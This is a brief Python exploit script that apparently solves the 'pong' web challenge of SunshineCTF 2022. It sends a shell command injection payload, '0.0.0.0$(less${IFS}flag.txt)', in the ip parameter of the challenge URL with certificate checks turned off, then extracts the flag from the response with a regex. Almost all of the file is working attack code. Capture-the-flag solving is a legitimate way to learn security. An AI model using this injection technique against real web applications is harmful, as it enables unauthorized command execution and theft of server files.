import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://pong.web.2022.sunshinectf.org/?ip=&submit=Play'
#myobj = {'somekey': 'somevalue'}

payload = "0.0.0.0$(less${IFS}flag.txt)"

final = f'https://pong.web.2022.sunshinectf.org/?ip={payload}&submit=Play'

x = requests.get(final,verify=False)

flag = re.findall(r"sun{.*?}", x.text)[0]

print(flag)